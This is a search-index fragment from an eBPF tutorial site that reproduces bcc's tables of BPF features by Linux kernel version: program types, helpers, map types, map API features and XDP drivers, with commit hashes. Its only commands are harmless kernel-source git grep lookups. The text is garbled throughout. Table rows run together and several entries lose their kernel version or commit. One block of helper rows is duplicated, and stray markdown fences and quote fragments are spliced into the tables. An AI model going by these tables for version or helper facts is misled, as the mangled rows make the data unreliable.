<p>\u5728\u60a8\u7684\u5185\u6838\u6e90\u4ee3\u7801\u4e2d\u67e5\u770bGPL\u517c\u5bb9\u8bb8\u53ef\u8bc1\u7684\u5217\u8868\u3002</p>"},{"location":"tutorials/bcc-documents/kernel-versions/#_3","title":"\u7a0b\u5e8f\u7c7b\u578b","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u83b7\u53d6\u7a0b\u5e8f\u7c7b\u578b\u548c\u652f\u6301\u7684\u8f85\u52a9\u51fd\u6570\u5217\u8868\uff1a</p> <pre><code>git grep -W 'func_proto(enum bpf_func_id func_id' kernel/ net/ drivers/\n</code></pre> \u7a0b\u5e8f\u7c7b\u578b \u8f85\u52a9\u51fd\u6570 <code>BPF_PROG_TYPE_SOCKET_FILTER</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>BPF_FUNC_skb_load_bytes_relative()</code> <code>BPF_FUNC_get_socket_cookie()</code> <code>BPF_FUNC_get_socket_uid()</code> <code>BPF_FUNC_perf_event_output()</code> <code>\u57fa\u7840\u51fd\u6570</code> <code>BPF_PROG_TYPE_KPROBE</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_stackid()</code> <code>BPF_FUNC_get_stack()</code> <code>BPF_FUNC_perf_event_read_value()</code> <code>BPF_FUNC_override_return()</code> <code>\u8ddf\u8e2a\u51fd\u6570</code> <code>BPF_PROG_TYPE_TRACEPOINT</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_stackid()</code> <code>BPF_FUNC_get_stack()</code> <code>BPF_FUNC_d_path()</code> <code>\u8ddf\u8e2a\u51fd\u6570</code> <code>BPF_PROG_TYPE_XDP</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_smp_processor_id()</code> <code>BPF_FUNC_csum_diff()</code> <code>BPF_FUNC_xdp_adjust_head()</code> <code>BPF_FUNC_xdp_adjust_meta()</code> <code>BPF_FUNC_redirect()</code> <code>BPF_FUNC_redirect_map()</code> <code>BPF_FUNC_xdp_adjust_tail()</code> <code>BPF_FUNC_fib_lookup()</code> <code>\u57fa\u7840\u51fd\u6570</code> <code>BPF_PROG_TYPE_PERF_EVENT</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_stackid()</code> <code>BPF_FUNC_get_stack()</code> <code>BPF_FUNC_perf_prog_read_value()</code> <code>\u8ddf\u8e2a\u51fd\u6570</code> <code>BPF_PROG_TYPE_CGROUP_SOCK</code> |<code>BPF_FUNC_get_current_uid_gid()</code> <code>\u57fa\u672c\u529f\u80fd</code> <code>BPF_PROG_TYPE_LWT_IN</code> |<code>BPF_FUNC_lwt_push_encap()</code> <code>LWT\u529f\u80fd</code> <code>\u57fa\u672c\u529f\u80fd</code> <code>BPF_PROG_TYPE_LWT_OUT</code> <code>LWT\u529f\u80fd</code> <code>\u57fa\u672c\u529f\u80fd</code> <code>BPF_PROG_TYPE_LWT_XMIT</code> |<code>BPF_FUNC_skb_get_tunnel_key()</code> <code>BPF_FUNC_skb_set_tunnel_key()</code> <code>BPF_FUNC_skb_get_tunnel_opt()</code> <code>BPF_FUNC_skb_set_tunnel_opt()</code> <code>BPF_FUNC_redirect()</code> <code>BPF_FUNC_clone_redirect()</code> <code>BPF_FUNC_skb_change_tail()</code> <code>BPF_FUNC_skb_change_head()</code> <code>BPF_FUNC_skb_store_bytes()</code> <code>BPF_FUNC_csum_update()</code> <code>BPF_FUNC_l3_csum_replace()</code> <code>BPF_FUNC_l4_csum_replace()</code> <code>BPF_FUNC_set_hash_invalid()</code> <code>LWT\u529f\u80fd</code> <code>BPF_PROG_TYPE_SOCK_OPS</code> |<code>BPF_FUNC_setsockopt()</code> <code>BPF_FUNC_getsockopt()</code> <code>BPF_FUNC_sock_ops_cb_flags_set()</code> <code>BPF_FUNC_sock_map_update()</code> <code>BPF_FUNC_sock_hash_update()</code> <code>BPF_FUNC_get_socket_cookie()</code> <code>\u57fa\u672c\u529f\u80fd</code> <code>BPF_PROG_TYPE_SK_SKB</code> |<code>BPF_FUNC_skb_store_bytes()</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>BPF_FUNC_skb_pull_data()</code> <code>BPF_FUNC_skb_change_tail()</code> <code>BPF_FUNC_skb_change_head()</code> <code>BPF_FUNC_get_socket_cookie()</code> <code>BPF_FUNC_get_socket_uid()</code> <code>BPF_FUNC_sk_redirect_map()</code> <code>BPF_FUNC_sk_redirect_hash()</code> <code>BPF_FUNC_sk_lookup_tcp()</code> <code>BPF_FUNC_sk_lookup_udp()</code> <code>BPF_FUNC_sk_release()</code> <code>\u57fa\u672c\u529f\u80fd</code> <code>BPF_PROG_TYPE_CGROUP_DEVICE</code> |<code>BPF_FUNC_map_lookup_elem()</code> <code>BPF_FUNC_map_update_elem()</code> <code>BPF_FUNC_map_delete_elem()</code> <code>BPF_FUNC_get_current_uid_gid()</code> <code>BPF_FUNC_trace_printk()</code> <code>BPF_PROG_TYPE_RAW_TRACEPOINT</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_stackid()</code> <code>BPF_FUNC_get_stack()</code> <code>BPF_FUNC_skb_output()</code> <code>\u8ddf\u8e2a\u529f\u80fd</code> <code>BPF_PROG_TYPE_CGROUP_SOCK_ADDR</code> <code>BPF_FUNC_get_current_uid_gid()</code> <code>BPF_FUNC_bind()</code> <code>BPF_FUNC_get_socket_cookie()</code> <code>\u57fa\u672c\u529f\u80fd</code> <code>BPF_PROG_TYPE_LWT_SEG6LOCAL</code> <code>BPF_FUNC_lwt_seg6_store_bytes()</code> <code>BPF_FUNC_lwt_seg6_action()</code> <code>BPF_FUNC_lwt_seg6_adjust_srh()</code> <code>LWT\u529f\u80fd</code> <code>BPF_PROG_TYPE_LIRC_MODE2</code> <code>BPF_FUNC_rc_repeat()</code> <code>BPF_FUNC_rc_keydown()</code> <code>BPF_FUNC_rc_pointer_rel()</code> <code>BPF_FUNC_map_lookup_elem()</code> <code>BPF_FUNC_map_update_elem()</code> <code>BPF_FUNC_map_delete_elem()</code> <code>BPF_FUNC_ktime_get_ns()</code> <code>BPF_FUNC_tail_call()</code> <code>BPF_FUNC_get_prandom_u32()</code> <code>BPF_FUNC_trace_printk()</code> <code>BPF_PROG_TYPE_SK_REUSEPORT</code> <code>BPF_FUNC_sk_select_reuseport()</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>BPF_FUNC_load_bytes_relative()</code> <code>\u57fa\u672c\u529f\u80fd</code> <code>BPF_PROG_TYPE_FLOW_DISSECTOR</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>\u57fa\u672c\u529f\u80fd</code> \u529f\u80fd\u7ec4 \u529f\u80fd <code>\u57fa\u672c\u529f\u80fd</code> <code>BPF_FUNC_map_lookup_elem()</code> <code>BPF_FUNC_map_update_elem()</code> <code>BPF_FUNC_map_delete_elem()</code> <code>BPF_FUNC_map_peek_elem()</code> <code>BPF_FUNC_map_pop_elem()</code> <code>BPF_FUNC_map_push_elem()</code> <code>BPF_FUNC_get_prandom_u32()</code> <code>BPF_FUNC_get_smp_processor_id()</code> <code>BPF_FUNC_get_numa_node_id()</code> <code>BPF_FUNC_tail_call()</code> <code>BPF_FUNC_ktime_get_boot_ns()</code> <code>BPF_FUNC_ktime_get_ns()</code> <code>BPF_FUNC_trace_printk()</code> <code>BPF_FUNC_spin_lock()</code> <code>BPF_FUNC_spin_unlock()</code> <code>LWT\u51fd\u6570</code> <code>BPF_FUNC_skb_load_bytes()</code> <code>BPF_FUNC_skb_pull_data()</code> <code>BPF_FUNC_csum_diff()</code> <code>BPF_FUNC_get_cgroup_classid()</code> <code>BPF_FUNC_get_route_realm()</code> <code>BPF_FUNC_get_hash_recalc()</code> <code>BPF_FUNC_perf_event_output()</code> <code>BPF_FUNC_get_smp_processor_id()</code> <code>BPF_FUNC_skb_under_cgroup()</code> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/kernel-versions_en/","title":"BPF Features by Linux Kernel Version","text":""},{"location":"tutorials/bcc-documents/kernel-versions_en/#ebpf-support","title":"eBPF support","text":"Kernel version Commit 3.15 <code>bd4cf0ed331a</code>"},{"location":"tutorials/bcc-documents/kernel-versions_en/#jit-compiling","title":"JIT compiling","text":"<p>The list of supported architectures for your kernel can be retrieved with:</p> <pre><code>git grep HAVE_EBPF_JIT arch/\n</code></pre> Feature / Architecture Kernel version Commit x86_64 3.16 <code>622582786c9e</code> ARM64 3.18 <code>e54bcde3d69d</code> s390 4.1 <code>054623105728</code> Constant blinding for JIT machines 4.7 <code>4f3446bb809f</code> PowerPC64 4.8 <code>156d0e290e96</code> Constant blinding - PowerPC64 4.9 <code>b7b7013cac55</code> Sparc64 4.12 <code>7a12b5031c6b</code> MIPS 4.13 <code>f381bf6d82f0</code> ARM32 4.14 <code>39c13c204bb1</code> x86_32 4.18 <code>03f5781be2c7</code> RISC-V RV64G 5.1 <code>2353ecc6f91f</code>RISC-V RV32G PowerPC32 5.13 <code>51c66ad849a7</code> LoongArch 6.1 <code>5dc615520c4d</code>"},{"location":"tutorials/bcc-documents/kernel-versions_en/#main-features","title":"Main features","text":"<p>Several (but not all) of these main features translate to an eBPF program type. The list of such program types supported in your kernel can be found in file <code>include/uapi/linux/bpf.h</code>:</p> <pre><code>git grep -W 'bpf_prog_type {' include/uapi/linux/bpf.h\n</code></pre> Feature Kernel version Commit <code>AF_PACKET</code> (libpcap/tcpdump, <code>cls_bpf</code> classifier, netfilter's <code>xt_bpf</code>, team driver's load-balancing mode\u2026) 3.15 <code>bd4cf0ed331a</code> Kernel helpers 3.15 <code>bd4cf0ed331a</code> <code>bpf()</code> syscall 3.18 <code>99c55f7d47c0</code> Maps (a.k.a. Tables; details below) 3.18 <code>99c55f7d47c0</code> BPF attached to sockets 3.19 <code>89aa075832b0</code> BPF attached to <code>kprobes</code> 4.1 <code>2541517c32be</code> <code>cls_bpf</code> / <code>act_bpf</code> for <code>tc</code> 4.1 <code>e2e9b6541dd4</code> Tail calls 4.2 <code>04fd61ab36ec</code>Non-root programs on sockets Persistent maps and programs (virtual FS) 4.4 <code>b2197755b263</code> <code>tc</code>'s <code>direct-action</code> (<code>da</code>) mode 4.4 <code>045efa82ff56</code> <code>tc</code>'s <code>clsact</code> qdisc 4.5 <code>1f211a1b929c</code> BPF attached to tracepoints 4.7 <code>98b5c2c65c29</code> Direct packet access 4.7 <code>969bf05eb3ce</code> XDP (see below) 4.8 <code>6a773a15a1e8</code> BPF attached to perf events 4.9 <code>0515e5999a46</code> Hardware offload for <code>tc</code>'s <code>cls_bpf</code> 4.9 <code>332ae8e2f6ec</code> Verifier exposure and internal hooks 4.9 <code>13a27dfc6697</code> BPF attached to cgroups for socket filtering 4.10 <code>0e33661de493</code> Lightweight tunnel encapsulation 4.10 <code>3a0af8fd61f9</code> eBPF support for <code>xt_bpf</code> module (iptables) 4.10 <code>2c16d6033264</code> BPF program tag 4.10 <code>7bd509e311f4</code>Tracepoints to debug BPF Testing / benchmarking BPF programs 4.12 <code>1cf1cae963c2</code> BPF programs and maps IDs 4.13 <code>dc4bb0e23561</code> BPF support for <code>sock_ops</code> 4.13 <code>40304b2a1567</code> BPF support for skbs on sockets 4.14 <code>b005fd189cec</code> bpftool utility in kernel sources 4.15 <code>71bb428fe2c1</code> BPF attached to cgroups as device controller 4.15 <code>ebc614f68736</code> bpf2bpf function calls 4.16 <code>cc8b0b92a169</code> BPF used for monitoring socket RX/TX data 4.17 <code>4f738adba30a</code> BPF attached to raw tracepoints 4.17 <code>c4f6699dfcb8</code> BPF attached to <code>bind()</code> system call 4.17 <code>4fbac77d2d09</code> <code>aac3fc320d94</code> BPF attached to <code>connect()</code> system call 4.17 <code>d74bad4e74ee</code>BPF Type Format (BTF) AF_XDP 4.18 <code>fbfc504a24f5</code> bpfilter 4.18 <code>d2ba09c17a06</code> End.BPF action for seg6local LWT 4.18 <code>004d4b274e2a</code> BPF attached to LIRC devices 4.18 <code>f4364dcfc86d</code> Pass map values to map helpers 4.18 <code>d71962f3e627</code> BPF socket reuseport 4.19 <code>2dbb9b9e6df6</code> BPF flow dissector 4.20 <code>d58e468b1112</code> BPF 1M insn limit 5.2 <code>c04c0d2b968a</code> BPF cgroup sysctl 5.2 <code>7b146cebe30c</code> BPF raw tracepoint writable 5.2 <code>9df1c28bb752</code> BPF bounded loop 5.3 <code>2589726d12a1</code> BPF trampoline 5.5 <code>fec56f5890d9</code> BPF LSM hook 5.7 <code>fc611f47f218</code> <code>641cd7b06c91</code> BPF iterator 5.8 <code>180139dca8b3</code>BPF socket lookup hook Sleepable BPF programs 5.10 <code>1e6c62a88215</code>"},{"location":"tutorials/bcc-documents/kernel-versions_en/#program-types","title":"Program types","text":"Program type Kernel version Commit Enum Socket filter 3.19 <code>ddd872bc3098</code> BPF_PROG_TYPE_SOCKET_FILTER Kprobe 4.1 <code>2541517c32be</code> BPF_PROG_TYPE_KPROBE traffic control (TC) 4.1 <code>96be4325f443</code> BPF_PROG_TYPE_SCHED_CLS traffic control (TC) 4.1 <code>94caee8c312d</code> BPF_PROG_TYPE_SCHED_ACT Tracepoint 4.7 <code>98b5c2c65c29</code> BPF_PROG_TYPE_TRACEPOINT XDP 4.8 <code>6a773a15a1e8</code> BPF_PROG_TYPE_XDP Perf event 4.9 <code>0515e5999a46</code> BPF_PROG_TYPE_PERF_EVENT cgroup socket filtering 4.10 <code>0e33661de493</code> BPF_PROG_TYPE_CGROUP_SKB cgroup sock modification 4.10 <code>610236587600</code> BPF_PROG_TYPE_CGROUP_SOCK lightweight tunnel (IN) 4.10 <code>3a0af8fd61f9</code> BPF_PROG_TYPE_LWT_IN\".lightweight tunnel (OUT) lightweight tunnel (XMIT) 4.10 <code>3a0af8fd61f9</code> BPF_PROG_TYPE_LWT_XMIT cgroup sock ops (per conn) 4.13 <code>40304b2a1567</code> BPF_PROG_TYPE_SOCK_OPS stream parser / stream verdict 4.14 <code>b005fd189cec</code> BPF_PROG_TYPE_SK_SKB cgroup device manager 4.15 <code>ebc614f68736</code> BPF_PROG_TYPE_CGROUP_DEVICE socket msg verdict 4.17 <code>4f738adba30a</code> BPF_PROG_TYPE_SK_MSG Raw tracepoint 4.17 <code>c4f6699dfcb8</code> BPF_PROG_TYPE_RAW_TRACEPOINT socket binding 4.17 <code>4fbac77d2d09</code> BPF_PROG_TYPE_CGROUP_SOCK_ADDR LWT seg6local 4.18 <code>004d4b274e2a</code> BPF_PROG_TYPE_LWT_SEG6LOCAL lirc devices 4.18 <code>f4364dcfc86d</code> BPF_PROG_TYPE_LIRC_MODE2 lookup SO_REUSEPORT socket 4.19 <code>2dbb9b9e6df6</code> BPF_PROG_TYPE_SK_REUSEPORT flow dissector 4.20 <code>d58e468b1112</code> BPF_PROG_TYPE_FLOW_DISSECTOR.```markdown cgroup sysctl 5.2 <code>7b146cebe30c</code> BPF_PROG_TYPE_CGROUP_SYSCTL writable raw tracepoints 5.2 <code>9df1c28bb752</code> BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE cgroup getsockopt/setsockopt 5.3 <code>0d01da6afc54</code> BPF_PROG_TYPE_CGROUP_SOCKOPT Tracing (BTF/BPF trampoline) 5.5 <code>f1b9509c2fb0</code> BPF_PROG_TYPE_TRACING struct ops 5.6 <code>27ae7997a661</code> BPF_PROG_TYPE_STRUCT_OPS extensions 5.6 <code>be8704ff07d2</code> BPF_PROG_TYPE_EXT LSM 5.7 <code>fc611f47f218</code> BPF_PROG_TYPE_LSM lookup listening socket 5.9 <code>e9ddbb7707ff</code> BPF_PROG_TYPE_SK_LOOKUP Allow executing syscalls 5.15 <code>79a7f8bdb159</code> BPF_PROG_TYPE_SYSCALL"},{"location":"tutorials/bcc-documents/kernel-versions_en/#maps-aka-tables-in-bcc-lingo","title":"Maps (a.k.a. Tables, in BCC lingo)","text":""},{"location":"tutorials/bcc-documents/kernel-versions_en/#map-types","title":"Map types","text":"<p>The list of map types supported in your kernel can be found in file <code>include/uapi/linux/bpf.h</code>:</p> <pre><code>git grep -W 'bpf_map_type {' include/uapi/linux/bpf.h\n</code></pre> Map type Kernel version Commit Enum Hash 3.19 <code>0f8e4bd8a1fc</code> BPF_MAP_TYPE_HASH\". ```Array 3.19 <code>28fbcfa08d8e</code> BPF_MAP_TYPE_ARRAY Prog array 4.2 <code>04fd61ab36ec</code> BPF_MAP_TYPE_PROG_ARRAY Perf events 4.3 <code>ea317b267e9d</code> BPF_MAP_TYPE_PERF_EVENT_ARRAY Per-CPU hash 4.6 <code>824bd0ce6c7c</code> BPF_MAP_TYPE_PERCPU_HASH Per-CPU array 4.6 <code>a10423b87a7e</code> BPF_MAP_TYPE_PERCPU_ARRAY Stack trace 4.6 <code>d5a3b1f69186</code> BPF_MAP_TYPE_STACK_TRACE cgroup array 4.8 <code>4ed8ec521ed5</code> BPF_MAP_TYPE_CGROUP_ARRAY LRU hash 4.10 <code>29ba732acbee</code> <code>3a08c2fd7634</code> BPF_MAP_TYPE_LRU_HASH LRU per-CPU hash 4.10 <code>8f8449384ec3</code> <code>961578b63474</code> BPF_MAP_TYPE_LRU_PERCPU_HASH LPM trie (longest-prefix match) 4.11 <code>b95a5c4db09b</code> BPF_MAP_TYPE_LPM_TRIE Array of maps 4.12 <code>56f668dfe00d</code> BPF_MAP_TYPE_ARRAY_OF_MAPSHash of maps Netdevice references (array) 4.14 546ac1ffb70d BPF_MAP_TYPE_DEVMAP Socket references (array) 4.14 174a79ff9515 BPF_MAP_TYPE_SOCKMAP CPU references 4.15 6710e1126934 BPF_MAP_TYPE_CPUMAP AF_XDP socket (XSK) references 4.18 fbfc504a24f5 BPF_MAP_TYPE_XSKMAP Socket references (hashmap) 4.18 81110384441a BPF_MAP_TYPE_SOCKHASH cgroup storage 4.19 de9cbbaadba5 BPF_MAP_TYPE_CGROUP_STORAGE reuseport sockarray 4.19 5dc4c4b7d4e8 BPF_MAP_TYPE_REUSEPORT_SOCKARRAY precpu cgroup storage 4.20 b741f1630346 BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE queue 4.20 f1a2e44a3aec BPF_MAP_TYPE_QUEUE stack 4.20 f1a2e44a3aec BPF_MAP_TYPE_STACK socket local storage 5.2 6ac99e8f23d4 BPF_MAP_TYPE_SK_STORAGE\".Netdevice references (hashmap) struct ops 5.6 <code>85d33df357b6</code> BPF_MAP_TYPE_STRUCT_OPS ring buffer 5.8 <code>457f44363a88</code> BPF_MAP_TYPE_RINGBUF inode storage 5.10 <code>8ea636848aca</code> BPF_MAP_TYPE_INODE_STORAGE task storage 5.11 <code>4cf1bc1f1045</code> BPF_MAP_TYPE_TASK_STORAGE Bloom filter 5.16 <code>9330986c0300</code> BPF_MAP_TYPE_BLOOM_FILTER user ringbuf 6.1 <code>583c1f420173</code> BPF_MAP_TYPE_USER_RINGBUF"},{"location":"tutorials/bcc-documents/kernel-versions_en/#map-userspace-api","title":"Map userspace API","text":"<p>Some (but not all) of these API features translate to a subcommand beginning with <code>BPF_MAP_</code>. The list of subcommands supported in your kernel can be found in file <code>include/uapi/linux/bpf.h</code>:</p> <pre><code>git grep -W 'bpf_cmd {' include/uapi/linux/bpf.h\n</code></pre> Feature Kernel version Commit Basic operations (lookup, update, delete, <code>GET_NEXT_KEY</code>) 3.18 <code>db20fd2b0108</code> Pass flags to <code>UPDATE_ELEM</code> 3.19 <code>3274f52073d8</code> Pre-alloc map memory by default 4.6 <code>6c9059817432</code>Pass <code>NULL</code> to <code>GET_NEXT_KEY</code> Creation: select NUMA node 4.14 <code>96eabe7a40aa</code> Restrict access from syscall side 4.15 <code>6e71b04a8224</code> Creation: specify map name 4.15 <code>ad5b177bd73f</code> <code>LOOKUP_AND_DELETE_ELEM</code> 4.20 <code>bd513cd08f10</code> Creation: <code>BPF_F_ZERO_SEED</code> 5.0 <code>96b3b6c9091d</code> <code>BPF_F_LOCK</code> flag for lookup / update 5.1 <code>96049f3afd50</code> Restrict access from BPF side 5.2 <code>591fe9888d78</code> <code>FREEZE</code> 5.2 <code>87df15de441b</code> mmap() support for array maps 5.5 <code>fc9702273e2e</code> <code>LOOKUP_BATCH</code> 5.6 <code>cb4d03ab499d</code> <code>UPDATE_BATCH</code>, <code>DELETE_BATCH</code> 5.6 <code>aa2e93b8e58e</code> <code>LOOKUP_AND_DELETE_BATCH</code> 5.6 <code>057996380a42</code> <code>LOOKUP_AND_DELETE_ELEM</code> support for hash maps 5.14 <code>3e87f192b405</code>"},{"location":"tutorials/bcc-documents/kernel-versions_en/#xdp","title":"XDP","text":"<p>An approximate list of drivers or components supporting XDP programs for your kernel can be retrieved with:</p> <pre><code>git grep -l XDP_SETUP_PROG drivers/\n</code></pre> Feature / Driver Kernel version Commit XDP core architecture 4.8 <code>6a773a15a1e8</code> Action: drop 4.8 <code>6a773a15a1e8</code> Action: pass on to stack 4.8 <code>6a773a15a1e8</code> Action: direct forwarding (on same port) 4.8 <code>6ce96ca348a9</code> Direct packet data write 4.8 <code>4acf6c0b84c9</code> Mellanox <code>mlx4</code> driver 4.8 <code>47a38e155037</code> Mellanox <code>mlx5</code> driver 4.9 <code>86994156c736</code> Netronome <code>nfp</code> driver 4.10 <code>ecd63a0217d5</code> QLogic (Cavium) <code>qed*</code> drivers 4.10 <code>496e05170958</code> <code>virtio_net</code> driver 4.10 <code>f600b6905015</code> Broadcom <code>bnxt_en</code> driver 4.11 <code>c6d30e8391b8</code> Intel <code>ixgbe*</code> drivers 4.12 <code>924708081629</code> Cavium <code>thunderx</code> driver 4.12 <code>05c773f52b96</code> Generic XDP 4.12 <code>b5cdae3291f7</code>\".# Helpers <p>The list of helpers supported in your kernel can be found in file.\"<code>include/uapi/linux/bpf.h</code>:</p> <pre><code>git grep ' FN(' include/uapi/linux/bpf.h\n</code></pre> <p>Alphabetical order</p> Helper Kernel version License Commit <code>BPF_FUNC_bind()</code> 4.17 <code>d74bad4e74ee</code> <code>BPF_FUNC_bprm_opts_set()</code> 5.11 <code>3f6719c7b62f</code> <code>BPF_FUNC_btf_find_by_name_kind()</code> 5.14 <code>3d78417b60fb</code> <code>BPF_FUNC_cgrp_storage_delete()</code> 6.2 <code>c4bcfb38a95e</code> <code>BPF_FUNC_cgrp_storage_get()</code> 6.2 <code>c4bcfb38a95e</code> <code>BPF_FUNC_check_mtu()</code> 5.12 <code>34b2021cc616</code> <code>BPF_FUNC_clone_redirect()</code> 4.2 <code>3896d655f4d4</code> <code>BPF_FUNC_copy_from_user()</code> 5.10 <code>07be4c4a3e7a</code> <code>BPF_FUNC_copy_from_user_task()</code> 5.18 GPL <code>376040e47334</code> <code>BPF_FUNC_csum_diff()</code> 4.6 <code>7d672345ed29</code> <code>BPF_FUNC_csum_level()</code> 5.7 <code>7cdec54f9713</code> <code>BPF_FUNC_csum_update()</code> 4.9 <code>36bbef52c7eb</code>\". Helper Kernel version License Commit <code>BPF_FUNC_bind()</code> 4.17 <code>d74bad4e74ee</code> <code>BPF_FUNC_bprm_opts_set()</code> 5.11 <code>3f6719c7b62f</code> <code>BPF_FUNC_btf_find_by_name_kind()</code> 5.14 <code>3d78417b60fb</code> <code>BPF_FUNC_cgrp_storage_delete()</code> 6.2 <code>c4bcfb38a95e</code> <code>BPF_FUNC_cgrp_storage_get()</code> 6.2 <code>c4bcfb38a95e</code> <code>BPF_FUNC_check_mtu()</code> 5.12 <code>34b2021cc616</code> <code>BPF_FUNC_clone_redirect()</code> 4.2 <code>3896d655f4d4</code> <code>BPF_FUNC_copy_from_user()</code> 5.10 <code>07be4c4a3e7a</code> <code>BPF_FUNC_copy_from_user_task()</code> 5.18 GPL <code>376040e47334</code> <code>BPF_FUNC_csum_diff()</code> 4.6 <code>7d672345ed29</code> <code>BPF_FUNC_csum_level()</code> 5.7 <code>7cdec54f9713</code> <code>BPF_FUNC_csum_update()</code> 4.9 <code>36bbef52c7eb</code>\".<code>BPF_FUNC_current_task_under_cgroup()</code> <code>BPF_FUNC_d_path()</code> 5.10 <code>6e22ab9da793</code> <code>BPF_FUNC_dynptr_data()</code> 5.19 <code>34d4ef5775f7</code> <code>BPF_FUNC_dynptr_from_mem()</code> 5.19 <code>263ae152e962</code> <code>BPF_FUNC_dynptr_read()</code> 5.19 <code>13bbbfbea759</code> <code>BPF_FUNC_dynptr_write()</code> 5.19 <code>13bbbfbea759</code> <code>BPF_FUNC_fib_lookup()</code> 4.18 GPL <code>87f5fc7e48dd</code> <code>BPF_FUNC_find_vma()</code> 5.17 <code>7c7e3d31e785</code> <code>BPF_FUNC_for_each_map_elem()</code> 5.13 <code>69c087ba6225</code> <code>BPF_FUNC_get_attach_cookie()</code> 5.15 <code>7adfc6c9b315</code> <code>BPF_FUNC_get_branch_snapshot()</code> 5.16 GPL <code>856c02dbce4f</code> <code>BPF_FUNC_get_current_ancestor_cgroup_id()</code> 5.6 <code>b4490c5c4e02</code> <code>BPF_FUNC_get_cgroup_classid()</code> 4.3 <code>8d20aabe1c76</code> <code>BPF_FUNC_get_current_cgroup_id()</code> 4.18 <code>bf6fa2c893c5</code>\"<code>BPF_FUNC_get_current_comm()</code> <code>BPF_FUNC_get_current_pid_tgid()</code> 4.2 <code>ffeedafbf023</code> <code>BPF_FUNC_get_current_task()</code> 4.8 GPL <code>606274c5abd8</code> <code>BPF_FUNC_get_current_task_btf()</code> 5.11 GPL <code>3ca1032ab7ab</code> <code>BPF_FUNC_get_current_uid_gid()</code> 4.2 <code>ffeedafbf023</code> <code>BPF_FUNC_get_func_arg()</code> 5.17 <code>f92c1e183604</code> <code>BPF_FUNC_get_func_arg_cnt()</code> 5.17 <code>f92c1e183604</code> <code>BPF_FUNC_get_func_ip()</code> 5.15 <code>5d8b583d04ae</code> <code>BPF_FUNC_get_func_ret()</code> 5.17 <code>f92c1e183604</code> <code>BPF_FUNC_get_retval()</code> 5.18 <code>b44123b4a3dc</code> <code>BPF_FUNC_get_hash_recalc()</code> 4.8 <code>13c5c240f789</code> <code>BPF_FUNC_get_listener_sock()</code> 5.1 <code>dbafd7ddd623</code> <code>BPF_FUNC_get_local_storage()</code> 4.19 <code>cd3394317653</code> <code>BPF_FUNC_get_netns_cookie()</code> 5.7 <code>f318903c0bf4</code>\". <code>BPF_FUNC_get_ns_current_pid_tgid()</code> 5.7 <code>b4490c5c4e02</code> <code>BPF_FUNC_get_numa_node_id()</code> 4.10 <code>2d0e30c30f84</code> <code>BPF_FUNC_get_prandom_u32()</code> 4.1 <code>03e69b508b6f</code> <code>BPF_FUNC_get_route_realm()</code> 4.4 <code>c46646d0484f</code> <code>BPF_FUNC_get_smp_processor_id()</code> 4.1 <code>c04167ce2ca0</code> <code>BPF_FUNC_get_socket_cookie()</code> 4.12 <code>91b8270f2a4d</code> <code>BPF_FUNC_get_socket_uid()</code> 4.12 <code>6acc5c291068</code> <code>BPF_FUNC_get_stack()</code> 4.18 GPL <code>de2ff05f48af</code> <code>BPF_FUNC_get_stackid()</code> 4.6 GPL <code>d5a3b1f69186</code> <code>BPF_FUNC_get_task_stack()</code> 5.9 <code>fa28dcb82a38</code> <code>BPF_FUNC_getsockopt()</code> 4.15 <code>cd86d1fd2102</code> <code>BPF_FUNC_ima_file_hash()</code> 5.18 <code>174b16946e39</code> <code>BPF_FUNC_ima_inode_hash()</code> 5.11 <code>27672f0d280a</code> <code>BPF_FUNC_inode_storage_delete()</code> 5.10 <code>8ea636848aca</code><code>`BPF_FUNC_inode_storage_get()</code> | 5.10 |  | <code>8ea636848aca</code> <code>BPF_FUNC_jiffies64()</code> 5.5 <code>5576b991e9c1</code> <code>BPF_FUNC_kallsyms_lookup_name()</code> 5.16 <code>d6aef08a872b</code> <code>BPF_FUNC_kptr_xchg()</code> 5.19 <code>c0a5a21c25f3</code> <code>BPF_FUNC_ktime_get_boot_ns()</code> 5.8 <code>71d19214776e</code> <code>BPF_FUNC_ktime_get_coarse_ns()</code> 5.11 <code>d05512618056</code> <code>BPF_FUNC_ktime_get_ns()</code> 4.1 <code>d9847d310ab4</code> <code>BPF_FUNC_ktime_get_tai_ns()</code> 6.1 <code>c8996c98f703</code> <code>BPF_FUNC_l3_csum_replace()</code> 4.1 <code>91bc4822c3d6</code> <code>BPF_FUNC_l4_csum_replace()</code> 4.1 <code>91bc4822c3d6</code> <code>BPF_FUNC_load_hdr_opt()</code> 5.10 <code>0813a841566f</code> <code>BPF_FUNC_loop()</code> 5.17 <code>e6f2dd0f8067</code> <code>BPF_FUNC_lwt_push_encap()</code> 4.18 <code>fe94cc290f53</code> <code>BPF_FUNC_lwt_seg6_action()</code> 4.18 <code>fe94cc290f53</code><code>BPF_FUNC_lwt_seg6_adjust_srh()</code> <code>BPF_FUNC_lwt_seg6_store_bytes()</code> 4.18 <code>fe94cc290f53</code> <code>BPF_FUNC_map_delete_elem()</code> 3.19 <code>d0003ec01c66</code> <code>BPF_FUNC_map_lookup_elem()</code> 3.19 <code>d0003ec01c66</code> <code>BPF_FUNC_map_lookup_percpu_elem()</code> 5.19 <code>07343110b293</code> <code>BPF_FUNC_map_peek_elem()</code> 4.20 <code>f1a2e44a3aec</code> <code>BPF_FUNC_map_pop_elem()</code> 4.20 <code>f1a2e44a3aec</code> <code>BPF_FUNC_map_push_elem()</code> 4.20 <code>f1a2e44a3aec</code> <code>BPF_FUNC_map_update_elem()</code> 3.19 <code>d0003ec01c66</code> <code>BPF_FUNC_msg_apply_bytes()</code> 4.17 <code>2a100317c9eb</code> <code>BPF_FUNC_msg_cork_bytes()</code> 4.17 <code>91843d540a13</code> <code>BPF_FUNC_msg_pop_data()</code> 5.0 <code>7246d8ed4dcc</code> <code>BPF_FUNC_msg_pull_data()</code> 4.17 <code>015632bb30da</code> 